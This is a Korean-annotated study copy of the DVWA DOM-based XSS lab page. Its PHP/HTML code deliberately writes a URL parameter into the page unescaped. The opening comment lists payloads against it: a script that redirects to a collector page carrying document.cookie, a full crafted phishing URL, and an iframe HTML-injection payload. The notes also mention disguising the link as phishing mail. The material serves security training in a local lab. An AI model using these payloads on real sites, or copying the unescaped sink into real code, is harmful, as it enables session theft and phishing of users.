<!--
<script>alert(document.cookie)</script>
dom을 조작하는 공격법
파일인루전 처럼 변수가 페이지의 영향을 받을때 주소공격을 하는 방법이다

변수의 주소 위치에
<script>location.replace("http://localhost/3.dvwa/9.XSS%20(DOM)/XSS-d.php?"+document.cookie);</script>
을 넣으므써
쿠키값을 전송 받는다.
이를 피싱메일로 둔갑하여 피싱 할 수 있다.
http://localhost/3.dvwa/9.XSS%20(DOM)/9-1.XSS%20(DOM).php?default=%3Cscript%3Elocation.href=%22http://localhost/3.dvwa/9.XSS%20(DOM)/XSS-d.php?%22+document.cookie;%3C/script%3E



종종 보면
[인터넷 옵션] -> [보안] -> [사용자 지정수준] -> [보안 설정]
이를 이용하여 xss를 막는 경우가 있는데 이 경우는 html 인젝션을 이용한다.
</option></select><iframe width=600 height=400 src="http://localhost/3.dvwa/1.brutefource/0.get/1-1.bru-GET.php"></iframe>

이렇게 하면 stored 나 reflected 처럼 페이지를 조작도 할 수 있고 조작한 사이트를 메일로 둔갑하여 피싱을 유도 할 수도 있다.

보안설정이 되어있다는 전제하에





-->


<?php
$b = setcookie("cookie",md5( uniqid() ), time()+300);
?>


<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">

<html>

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />


</head>
<body class="home">
<h1>Vulnerability: DOM Based Cross Site Scripting (XSS)</h1>

<div class="vulnerable_code_area">

    <p>Please choose a language:</p>

    <form name="XSS" method="GET">
        <select name="default">
            <script>
                if (document.location.href.indexOf("default=") >= 0) {

                    //--------------------------------------------------------------------
                    //string.indexOf(searchvalue, position)
                    //indexOf 함수는, 문자열(string)에서 특정 문자열(searchvalue)을 찾고,
                    //검색된 문자열이 '첫번째'로 나타나는 위치 index를 리턴합니다.
                    //파라미터
                    //searchvalue : 필수 입력값, 찾을 문자열
                    //position : optional, 기본값은 0, string에서 searchvalue를 찾기 시작할 위치
                    //찾는 문자열이 없으면 -1을 리턴합니다.
                    //문자열을 찾을 때 대소문자를 구분합니다
                    //ex)-----------------------------------------------------------------
                    //const str = "abab";
                    //document.writeln(str.indexOf('ab'));  //  0
                    //document.writeln(str.indexOf('ba'));  //  1
                    //document.writeln(str.indexOf('abc')); // -1
                    //document.writeln(str.indexOf('AB'));  // -1
                    //--------------------------------------------------------------------


                    //   href 는 location 객체에 속해있는 프로퍼티로 현재 접속중인 페이지 정보를 갖고 있습니다.
                    //   또한 값을 변경할 수 있는 프로퍼티이기 때문에 다른 페이지로 이동하는데도 사용되고 있습니다.

                    //     document.write(document.location.href);
                    // >>  http://localhost/3.dvwa/9.XSS%20(DOM)/9-1.XSS%20(DOM).php


                        var lang = document.location.href.substring(document.location.href.indexOf("default=")+8);
                    //    substring()함수는 substr() 함수와 같이 특정 문자열을 잘라내여 반환합니다.
                    //    var str = "안녕하세요?"
                    //    var first_char = str.substring(0);  >>   안녕하세요?
                    //    쉽게 말하면 선택한 english 등 시작점을 의미한다


                    document.write("<option value='" + lang + "'>" + decodeURI(lang) + "</option>");
                    //주소가 url 인고킹 되어있을 시 이를 디코딩 하라는 뜻
                    document.write("<option value='' disabled='disabled'>----</option>");
                    //고르지 않았다면

                    // 결론 >> 고른애를 선택되게하는 기능이다.
                }


                document.write("<option value='English'>English</option>");
                document.write("<option value='French'>French</option>");
                document.write("<option value='Spanish'>Spanish</option>");
                document.write("<option value='German'>German</option>");
            </script>
        </select>
        <input type="submit" value="Select" />
    </form>


</body>
</html>